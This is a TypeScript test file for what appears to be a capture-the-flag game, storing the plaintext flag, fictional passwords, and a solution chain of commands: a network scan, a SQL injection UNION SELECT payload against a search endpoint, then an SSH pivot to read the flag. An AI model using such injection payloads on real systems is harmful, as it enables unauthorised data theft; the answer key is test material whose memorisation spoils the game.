// TEST-ONLY: the plaintext flag and canonical solution live here, never in the bundle.
export const FLAG = 'FLAG{r00t_4cc3ss_gr4nt3d}';

export const DEPLOY_PASSWORD = 'd3pl0y-3ac9f1';
export const VAULT_PASSPHRASE = 'Vault-Core-2026';

/** The full chain: recon -> web injection -> decrypt -> ssh pivot -> read the flag. */
export const SOLUTION: readonly string[] = [
  'nmap corp-core',
  'curl http://corp-core.novacorp.internal/robots.txt',
  `curl "http://corp-core.novacorp.internal/api/search?q=' UNION SELECT label, value, note FROM vault -- "`,
  // The injection yields the base64 blob and its passphrase; decrypt to the ssh password.
  'ssh deploy@corp-core.novacorp.internal',
  'cat root-access.txt',
  `submit ${FLAG}`,
];

/** Obvious shortcuts that must NOT reveal or accept the flag. */
export const SHORTCUTS_THAT_FAIL: readonly string[] = [
  'ssh deploy@corp-core.novacorp.internal',
  'curl http://corp-core.novacorp.internal/api/search?q=Widget',
  'curl http://corp-core.novacorp.internal/vault',
];
